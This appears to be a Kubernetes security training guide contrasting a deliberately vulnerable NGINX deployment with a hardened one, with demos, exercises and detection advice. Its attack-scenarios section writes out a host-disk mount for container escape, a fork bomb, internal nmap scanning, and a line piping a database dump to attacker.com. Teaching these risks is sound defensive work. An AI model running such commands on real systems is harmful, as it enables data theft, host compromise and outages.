# Kubernetes Security Demonstration Guide

This guide helps you demonstrate common Kubernetes security vulnerabilities and best practices.

## ⚠️ IMPORTANT: Safety Notice

The vulnerable application (`nginx-vulnerable.yaml`) contains intentional security flaws for educational purposes only:
- **DO NOT** expose this to the public internet
- **DO NOT** use in production
- **DO NOT** store real credentials in it
- Use only in isolated lab environments
- Delete after demonstration

## Overview

We provide two NGINX deployments:
1. **nginx-vulnerable.yaml** - Contains 16 common security issues
2. **nginx-secure.yaml** - Shows proper security configuration

## Quick Start

### Deploy Both Applications

```bash
# Deploy the vulnerable version
kubectl apply -f sample-app/nginx-vulnerable.yaml

# Deploy the secure version
kubectl apply -f sample-app/nginx-secure.yaml

# Check they're running
kubectl get pods
kubectl get services
```

### Access the Applications

```bash
# Get the external IPs (wait 1-2 minutes for LoadBalancer)
kubectl get service nginx-vulnerable
kubectl get service nginx-secure

# Visit in browser:
# http://<VULNERABLE-IP>    - Shows list of vulnerabilities
# http://<SECURE-IP>        - Shows security features
```

---

## Demonstration Scenarios

### Demo 1: Running as Root (Critical)

**Vulnerability:** Container runs with root privileges

**Show the vulnerable version:**
```bash
# Get the pod name
kubectl get pods | grep nginx-vulnerable

# Check who the process runs as
kubectl exec <vulnerable-pod> -- whoami
# Output: root  ❌ DANGER!

# Show full capabilities
kubectl exec <vulnerable-pod> -- capsh --print
# Output: Shows ALL capabilities ❌

# Show we can access host-level operations
kubectl exec <vulnerable-pod> -- ps aux
```

**Show the secure version:**
```bash
# Check who the process runs as
kubectl exec <secure-pod> -- whoami
# Output: nginx  ✅ Good!

# Try to become root (should fail)
kubectl exec <secure-pod> -- su -
# Output: Permission denied ✅

# Show dropped capabilities
kubectl describe pod <secure-pod> | grep -A 10 "Security Context"
```

**Key Learning:** Never run containers as root. Use runAsNonRoot and specific UIDs.

---

### Demo 2: Version Disclosure

**Vulnerability:** NGINX version exposed in headers

**Test vulnerable version:**
```bash
# Get external IP
VULNERABLE_IP=$(kubectl get service nginx-vulnerable -o jsonpath='{.status.loadBalancer.ingress[0].ip}')

# Check headers
curl -I http://$VULNERABLE_IP
# Look for: Server: nginx/1.14.0  ❌ Version exposed!
```

**Test secure version:**
```bash
SECURE_IP=$(kubectl get service nginx-secure -o jsonpath='{.status.loadBalancer.ingress[0].ip}')

curl -I http://$SECURE_IP
# Look for: Server: nginx  ✅ Version hidden!
```

**Key Learning:** Disable server_tokens to prevent information disclosure that helps attackers.

---

### Demo 3: Exposed Management Endpoints

**Vulnerability:** Internal status pages exposed publicly

**Test vulnerable version:**
```bash
# Access the server status page
curl http://$VULNERABLE_IP/server-status

# Output shows internal metrics:
# Active connections: 1
# server accepts handled requests
# Reading: 0 Writing: 1 Waiting: 0
# ❌ Internal information exposed!
```

**Test secure version:**
```bash
curl http://$SECURE_IP/server-status
# Output: 404 Not Found ✅
```

**Key Learning:** Never expose internal endpoints like /server-status, /metrics, /admin to the public.

---

### Demo 4: No Resource Limits (DoS Risk)

**Vulnerability:** Container can consume unlimited resources

**Show vulnerable version:**
```bash
kubectl describe pod <vulnerable-pod> | grep -A 5 "Limits"
# Output: <none>  ❌ No limits!

# This container could consume all node resources and crash other apps
```

**Show secure version:**
```bash
kubectl describe pod <secure-pod> | grep -A 5 "Limits"
# Output:
#   Limits:
#     cpu:     200m
#     memory:  128Mi
#   Requests:
#     cpu:     100m
#     memory:  64Mi
# ✅ Protected!
```

**Demonstrate the impact:**
```bash
# Show current resource usage
kubectl top pod <vulnerable-pod>
kubectl top pod <secure-pod>

# The vulnerable one COULD use 100% of node resources
# The secure one is limited to 200m CPU and 128Mi RAM
```

**Key Learning:** Always set resource requests and limits to prevent resource exhaustion attacks.

---

### Demo 5: Secrets in Plain Text

**Vulnerability:** Sensitive data stored insecurely

**Show vulnerable version:**
```bash
# View the environment variables
kubectl exec <vulnerable-pod> -- env | grep -E "PASSWORD|KEY|TOKEN"
# Output:
# ADMIN_PASSWORD=admin123  ❌
# API_KEY=sk_test_51234567890  ❌
# DATABASE_URL=mysql://root:password@db:3306/mydb  ❌

# View the ConfigMap (anyone with access can read this)
kubectl get configmap fake-secrets -o yaml
# Shows plain text passwords! ❌
```

**Show secure version:**
```bash
# Secrets are stored in Secret objects
kubectl get secret app-secrets -o yaml
# Data is base64 encoded (better, but still not perfect)

# In production, recommend:
echo "Use external secret managers like:"
echo "- Google Secret Manager"
echo "- HashiCorp Vault"
echo "- AWS Secrets Manager"
```

**Key Learning:** Never store secrets in ConfigMaps or environment variables. Use Secrets, and ideally external secret management.

---

### Demo 6: Missing Security Headers

**Vulnerability:** No protection against common web attacks

**Test vulnerable version:**
```bash
curl -I http://$VULNERABLE_IP
# Missing:
# X-Frame-Options  ❌ (clickjacking possible)
# X-Content-Type-Options  ❌ (MIME sniffing)
# Content-Security-Policy  ❌ (XSS attacks possible)
```

**Test secure version:**
```bash
curl -I http://$SECURE_IP
# Shows:
# X-Frame-Options: SAMEORIGIN  ✅
# X-Content-Type-Options: nosniff  ✅
# X-XSS-Protection: 1; mode=block  ✅
# Content-Security-Policy: default-src 'self'  ✅
```

**Key Learning:** Always add security headers to protect against common web attacks.

---

### Demo 7: No Health Checks

**Vulnerability:** Kubernetes can't detect unhealthy containers

**Show vulnerable version:**
```bash
kubectl describe pod <vulnerable-pod> | grep -E "Liveness|Readiness"
# Output: <none>  ❌

# If NGINX crashes or hangs, Kubernetes won't know!
```

**Show secure version:**
```bash
kubectl describe pod <secure-pod> | grep -A 3 "Liveness"
# Output shows configured probes  ✅

# Kill the nginx process and watch it restart
kubectl exec <secure-pod> -- nginx -s stop
kubectl get pods --watch
# Pod will restart automatically  ✅
```

**Key Learning:** Always configure liveness and readiness probes for automatic healing.

---

### Demo 8: Privileged Mode

**Vulnerability:** Container has full host access

**Show vulnerable version:**
```bash
kubectl describe pod <vulnerable-pod> | grep -i privileged
# Output: privileged: true  ❌ CRITICAL!

# This container can:
# - Access all host devices
# - Mount host filesystems
# - See all processes
# - Escape the container

# Demonstrate (CAREFULLY in isolated environment):
kubectl exec <vulnerable-pod> -- ls /dev
# Shows ALL host devices ❌
```

**Show secure version:**
```bash
kubectl describe pod <secure-pod> | grep -i privileged
# Output: privileged: false  ✅

kubectl exec <secure-pod> -- ls /dev
# Shows minimal devices ✅
```

**Key Learning:** NEVER use privileged: true unless absolutely necessary (and it almost never is).

---

### Demo 9: Using :latest Tag

**Vulnerability:** Non-deterministic deployments

**Show vulnerable version:**
```bash
kubectl describe pod <vulnerable-pod> | grep Image:
# Output: nginx:latest or nginx:1.14  
# ❌ Using old version with CVEs
# ❌ "latest" tag is unpredictable
```

**Show secure version:**
```bash
kubectl describe pod <secure-pod> | grep Image:
# Output: nginx:1.27.2-alpine  ✅
# - Specific version
# - Current and patched
# - Alpine for smaller attack surface
```

**Key Learning:** Always use specific version tags, never :latest. Keep images updated.

---

## Side-by-Side Comparison

### Security Posture Summary

| Security Feature | Vulnerable | Secure |
|-----------------|-----------|--------|
| Running as root | ❌ Yes (UID 0) | ✅ No (UID 101) |
| Privileged mode | ❌ Yes | ✅ No |
| Resource limits | ❌ None | ✅ Configured |
| Health probes | ❌ Missing | ✅ Configured |
| Security headers | ❌ Missing | ✅ Enabled |
| Version disclosure | ❌ Exposed | ✅ Hidden |
| Secrets management | ❌ Plain text | ✅ Secret object |
| Image version | ❌ Old/latest | ✅ Pinned current |
| Read-only root | ❌ No | ✅ Yes |
| Capabilities | ❌ ALL | ✅ Minimal |
| Rate limiting | ❌ None | ✅ Configured |
| Management endpoints | ❌ Exposed | ✅ Hidden |

---

## Scanning for Vulnerabilities

### Using kubectl

```bash
# Check security context
kubectl get pods -o json | jq '.items[].spec.containers[].securityContext'

# Find pods running as root
kubectl get pods -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.runAsUser == 0) | .metadata.name'

# Find privileged containers
kubectl get pods -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.name'
```

### Using Open Source Tools

```bash
# Install kubesec (https://kubesec.io/)
brew install kubesec  # or download from releases

# Scan the vulnerable deployment
kubesec scan sample-app/nginx-vulnerable.yaml

# Scan the secure deployment
kubesec scan sample-app/nginx-secure.yaml
```

---

## Discussion/Questions

1. **Why is running as root dangerous?**
   - Answer: If container is compromised, attacker has root access

2. **What's wrong with storing secrets in ConfigMaps?**
   - Answer: ConfigMaps are not encrypted at rest, visible in logs/events

3. **Why use specific image tags instead of :latest?**
   - Answer: Reproducibility, control over updates, security patches

4. **What could an attacker do with privileged: true?**
   - Answer: Escape container, access host, compromise entire node

5. **Why are resource limits important?**
   - Answer: Prevent DoS attacks, protect other workloads, cost control

6. **What's the risk of exposing server version?**
   - Answer: Attackers can target known CVEs for that specific version

7. **Why do we need health probes?**
   - Answer: Automatic healing, zero-downtime deployments, reliability

8. **What's wrong with hostNetwork: true?**
   - Answer: Container can sniff network traffic, access host services

---

## Cleanup After Demo

```bash
# Delete both deployments
kubectl delete -f sample-app/nginx-vulnerable.yaml
kubectl delete -f sample-app/nginx-secure.yaml

# Verify cleanup
kubectl get all | grep nginx
```

---

## Extended Exercises

### Exercise 1: Fix the Vulnerabilities

**Task:** Fix/Update all security issues.

**Checklist:**
- [ ] Change runAsUser to non-root (101)
- [ ] Set privileged: false
- [ ] Add resource limits
- [ ] Add liveness/readiness probes
- [ ] Use specific image version (not :latest)
- [ ] Drop all capabilities
- [ ] Enable readOnlyRootFilesystem
- [ ] Move secrets from ConfigMap to Secret
- [ ] Remove hardcoded credentials from env vars
- [ ] Disable server_tokens in nginx.conf
- [ ] Add security headers
- [ ] Remove exposed /server-status endpoint

### Exercise 2: Security Scanning

**Task:** Use tools to scan for vulnerabilities

```bash
# Install trivy (vulnerability scanner)
brew install trivy

# Scan the vulnerable image
trivy image nginx:1.14

# Scan the secure image
trivy image nginx:1.27.2-alpine

# Compare the number of CVEs
```

### Exercise 3: Pod Security Standards

**Task:** Apply Kubernetes Pod Security Standards

```bash
# Create a namespace with restricted policy
kubectl create namespace secure-namespace

# Label it for restricted enforcement
kubectl label namespace secure-namespace \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# Try to deploy vulnerable app (should fail)
kubectl apply -f sample-app/nginx-vulnerable.yaml -n secure-namespace
# Output: Error - violates PodSecurity "restricted"  ✅

# Deploy secure app (should succeed)
kubectl apply -f sample-app/nginx-secure.yaml -n secure-namespace
# Output: deployment.apps/nginx-secure created  ✅
```

### Exercise 4: Network Policies

**Task:** Create network policies to restrict traffic

```yaml
# network-policy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: nginx-network-policy
spec:
  podSelector:
    matchLabels:
      app: nginx-secure
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend  # Only allow from frontend
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: backend  # Only allow to backend
    ports:
    - protocol: TCP
      port: 3000
```

### Exercise 5: RBAC Configuration

**Task:** Implement least-privilege RBAC

```yaml
# Create a restricted ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: nginx-sa
---
# Create a Role with minimal permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: nginx-role
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
  # NO create, delete, or update
---
# Bind the Role to the ServiceAccount
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: nginx-rolebinding
subjects:
- kind: ServiceAccount
  name: nginx-sa
roleRef:
  kind: Role
  name: nginx-role
  apiGroup: rbac.authorization.k8s.io
```

---

## Real-World Attack Scenarios

### Scenario 1: Container Escape

**Setup:** Deploy vulnerable pod with privileged: true

**Attack:**
```bash
# Attacker gains shell access
kubectl exec -it <vulnerable-pod> -- /bin/bash

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host

# Now attacker has access to entire host!
ls /host
# ❌ Can read SSH keys, modify system files, etc.
```

**Prevention:** Never use privileged mode, drop capabilities

### Scenario 2: Credential Theft

**Setup:** Secrets in environment variables

**Attack:**
```bash
# Attacker gets pod access
kubectl exec <vulnerable-pod> -- env

# Sees all credentials in plain text
ADMIN_PASSWORD=admin123
API_KEY=sk_test_51234567890

# Can now access databases, APIs, etc.
```

**Prevention:** Use proper secret management, never env vars

### Scenario 3: Lateral Movement

**Setup:** No network policies

**Attack:**
```bash
# Compromise one pod
kubectl exec <vulnerable-pod> -- /bin/bash

# Scan internal network
apt-get update && apt-get install -y nmap
nmap 10.0.0.0/16

# Find other services
# Access internal databases, APIs without authentication
curl http://internal-database:5432
```

**Prevention:** Implement network policies, service mesh

### Scenario 4: Resource Exhaustion

**Setup:** No resource limits

**Attack:**
```bash
# Attacker creates infinite loop
kubectl exec <vulnerable-pod> -- /bin/bash

# Fork bomb or memory hog
:(){ :|:& };:

# OR
while true; do malloc 1GB; done

# Crashes entire node, affects all pods
```

**Prevention:** Set resource limits and quotas

### Scenario 5: Data Exfiltration

**Setup:** No egress restrictions

**Attack:**
```bash
# Attacker dumps sensitive data
kubectl exec <vulnerable-pod> -- /bin/bash

# Finds database credentials in ConfigMap
kubectl get configmap fake-secrets -o yaml

# Connects to database
mysql -h db.internal -u root -pSuperSecret123

# Exfiltrates data to external server
mysqldump --all-databases | curl -X POST http://attacker.com/data
```

**Prevention:** Network policies for egress, audit logging

---

## Detection and Monitoring

### Signs of Compromise

```bash
# 1. Check for unusual processes
kubectl exec <pod> -- ps aux | grep -v nginx

# 2. Check for network connections
kubectl exec <pod> -- netstat -tuln

# 3. Check for modified files
kubectl exec <pod> -- find / -mtime -1 -type f

# 4. Review pod events
kubectl describe pod <pod> | grep -A 10 Events

# 5. Check resource usage
kubectl top pods
```

### Logging and Auditing

```bash
# Enable audit logging (GKE)
# Already enabled by default in GKE

# View audit logs
gcloud logging read "resource.type=k8s_cluster" --limit 50

# Search for security events
gcloud logging read 'protoPayload.methodName="io.k8s.core.v1.pods.exec"' --limit 20

# Alert on suspicious activities:
# - Exec into pods
# - Privileged pod creation
# - Secret access
# - ServiceAccount token usage
```

---

## Security Checklist

### Before Deployment

- [ ] Review all security contexts
- [ ] Verify no privileged containers
- [ ] Check all pods run as non-root
- [ ] Ensure resource limits are set
- [ ] Verify health probes configured
- [ ] Check secrets are not in ConfigMaps
- [ ] Validate no hardcoded credentials
- [ ] Use specific image versions (not :latest)
- [ ] Scan images for vulnerabilities
- [ ] Review RBAC permissions
- [ ] Implement network policies
- [ ] Enable Pod Security Standards
- [ ] Configure audit logging
- [ ] Set up monitoring and alerts

### Container Image Hardening

```dockerfile
# Use minimal base images
FROM nginx:1.27.2-alpine  # Alpine is smaller

# Don't run as root
USER 101

# Remove unnecessary packages
RUN apk del curl wget  # If not needed

# Use specific versions
RUN apk add --no-cache nginx=1.27.2-r0

# Read-only filesystem
VOLUME /var/cache/nginx /var/run
```

### Runtime Security

```bash
# Use Falco for runtime security
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco

# Falco will alert on:
# - Shell spawned in container
# - File modified in /etc
# - Sensitive file opened
# - Unexpected network connections
```

---

## Additional Resources

### Documentation
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [OWASP Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)

### Tools
- **kubesec** - Security risk analysis: https://kubesec.io/
- **trivy** - Container vulnerability scanner: https://trivy.dev/
- **kube-bench** - CIS Kubernetes Benchmark: https://github.com/aquasecurity/kube-bench
- **Falco** - Runtime security: https://falco.org/
- **OPA/Gatekeeper** - Policy enforcement: https://open-policy-agent.github.io/gatekeeper/

### Training
- [Kubernetes Security Fundamentals (LFS260)](https://training.linuxfoundation.org/training/kubernetes-security-fundamentals/)
- [Certified Kubernetes Security Specialist (CKS)](https://www.cncf.io/certification/cks/)

---

### Key Takeaways

After this excercise, you should understand:
1. ✅ Never run containers as root
2. ✅ Always set resource limits
3. ✅ Use specific image versions
4. ✅ Implement least privilege everywhere
5. ✅ Secrets belong in Secret objects (or external managers)
6. ✅ Health probes are critical
7. ✅ Security is layered (defense in depth)
8. ✅ Scan and patch regularly


---

## Quick Reference Commands

```bash
# Deploy vulnerable app
kubectl apply -f sample-app/nginx-vulnerable.yaml

# Deploy secure app
kubectl apply -f sample-app/nginx-secure.yaml

# Check running as root
kubectl exec <pod> -- whoami

# Check security context
kubectl describe pod <pod> | grep -A 10 "Security Context"

# Check resource limits
kubectl describe pod <pod> | grep -A 5 "Limits"

# View headers
curl -I http://<IP>

# Check for vulnerabilities
trivy image nginx:1.14

# Scan YAML
kubesec scan file.yaml

# View secrets
kubectl get secrets

# Check pod security
kubectl get pods -o json | jq '.items[].spec.securityContext'

# Cleanup
kubectl delete -f sample-app/nginx-vulnerable.yaml
kubectl delete -f sample-app/nginx-secure.yaml
```

---

**Remember:** Security is not optional. It's a fundamental requirement for any Kubernetes deployment!

**Documentation by SecuredPress**

*Part of the GKE Kubernetes Security Demo Project*

© 2024 SecuredPress LLC. Licensed under MIT.